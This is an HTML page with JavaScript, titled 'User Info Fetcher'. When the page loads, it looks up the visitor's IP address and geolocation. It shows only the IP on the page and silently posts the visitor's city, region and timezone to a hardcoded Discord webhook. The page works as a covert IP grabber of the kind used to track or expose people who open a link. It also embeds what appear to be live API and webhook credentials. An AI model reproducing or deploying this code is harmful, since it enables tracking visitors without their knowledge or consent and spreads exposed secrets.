<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Info Fetcher</title>
</head>
<body>

<!-- Display the user's IP address on the webpage -->
<p>User's IP Address: <span id="ipAddress"></span></p>

<script>
  // Function to fetch user's IP address
  async function getIpAddress() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  }

  // Function to fetch location information from ipstack
  async function getLocationInfo(ipAddress) {
    const apiKey = 'bfe9f61029622f0926af1e770b11d503'; // Replace with your ipstack API key
    const response = await fetch(`https://api.ipstack.com/${ipAddress}?access_key=${apiKey}`);
    const data = await response.json();
    return data;
  }

  // Function to send data to Discord webhook
  async function sendToDiscord(locationInfo) {
    const { city, region_name, timezone } = locationInfo;
    const webhookURL = 'https://discord.com/api/webhooks/1197303153826218055/bUyjZhkxnSthZWF-UpyQJb4_wIF_NJZoM2Gn_5etKV9rwx-hfztGVXeLJDtyfEczvMSn'; // Replace with your Discord webhook URL

    // Create payload for Discord webhook
    const payload = {
        content: `User's Location: ${city}, ${region_name}, Timezone: ${timezone}`,
    };

    // Send data to Discord webhook
    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
  }

  // Main function to orchestrate the process
  async function main() {
    try {
      const ipAddress = await getIpAddress();
      // Display the user's IP address on the webpage
      document.getElementById('ipAddress').innerText = ipAddress;
      
      const locationInfo = await getLocationInfo(ipAddress);
      await sendToDiscord(locationInfo);
    } catch (error) {
      console.error('Error:', error);
    }
  }

  // Call the main function
  main();
</script>

</body>
</html>
